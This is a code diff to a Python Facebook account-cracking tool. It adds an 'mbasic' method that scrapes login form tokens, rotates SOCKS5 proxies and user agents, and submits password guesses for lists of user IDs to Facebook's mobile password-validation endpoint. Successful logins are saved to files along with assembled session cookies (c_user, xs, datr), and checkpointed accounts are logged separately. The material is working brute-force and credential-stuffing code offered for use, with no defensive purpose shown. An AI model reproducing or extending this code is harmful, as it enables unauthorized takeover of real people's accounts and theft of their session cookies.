@@ -1448,7 +1448,7 @@ def setting():
         exit()
     Console().print(
         Panel(
-            f"{P2}[{color_text}01{P2}] Login Site [bold green]async.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]validate.facebook.com[bold white]\n{P2}[{color_text}03{P2}] Login Site [bold green]reguler.facebook.com[bold white]",
+            f"{P2}[{color_text}01{P2}] Login Site [bold green]async.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]validate.facebook.com[bold white]\n{P2}[{color_text}03{P2}] Login Site [bold green]reguler.facebook.com[bold white]\n{P2}[{color_text}04{P2}] Login Site [bold green]mbasic.facebook.com[bold white] [/]",
             width=60,
             style=f"{color_panel}",
             title="[bold green] Method",
@@ -1461,6 +1461,8 @@ def setting():
         method.append("validate")
     elif hc in ["3", "03"]:
         method.append("reguler")
+    elif hc in ["4", "04"]:
+        method.append("mbasik")
     else:
         method.append("reguler")
     Console().print(
@@ -1581,6 +1583,8 @@ def passwrd():
                     pool.submit(asyncc, idf, pwv)
                 elif "validate" in method:
                     pool.submit(validate, idf, pwv)
+                elif "mbasik" in method:
+                    pool.submit(mbasic, idf, pwv)
                 else:
                     pool.submit(crackreg, idf, pwv)
         print("")
@@ -1610,7 +1614,70 @@ def passwrd():
         time.sleep(1)
         exit()
 
-
+def mbasic(idf,pwv):
+	global loop,ok,cp
+	bi = random.choice([u,k,kk,b,h,hh])
+	pers = loop*100/len(id2)
+	fff = '%'
+	nip=random.choice(prox)
+	proxs= {'http': 'socks5://'+nip}
+	ua = random.choice(prem)
+	ua2 = random.choice(prem)
+	ses = requests.Session()
+	prog.update(des,description=f" {K2}•{H2} MBASIC {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+	prog.advance(des)
+	for pw in pwv:
+		try:
+			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2.625; wd=412x756'
+			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
+			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				cp += 1
+				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
+				tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{K2}{ua}{P2}", style=f"{color_panel}"))
+				prints(tree)
+				os.popen("play-audio c.mp3")
+				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+				ceker(idf, pw)
+				akun.append(idf + "|" + pw)
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok += 1
+				coki = po.cookies.get_dict()
+				kuki = (
+                    "datr="
+                    + coki["datr"]
+                    + ";"
+                    + ("sb=" + coki["sb"])
+                    + ";"
+                    + "locale=id_ID"
+                    + ";"
+                    + ("c_user=" + coki["c_user"])
+                    + ";"
+                    + ("xs=" + coki["xs"])
+                    + ";"
+                    + ("fr=" + coki["fr"])
+                    + ";"
+                )
+				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
+				tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{H2}{ua}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{H2}{kuki}{P2}", style=f"{color_panel}"))
+				prints(tree)
+				os.popen("play-audio o.mp3")
+				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
+				cek_apk(kuki)
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
 # --------------------[ METODE VALIDATE ]-----------------#
 def crackreg(idf,pwv):
 	global loop,ok,cp
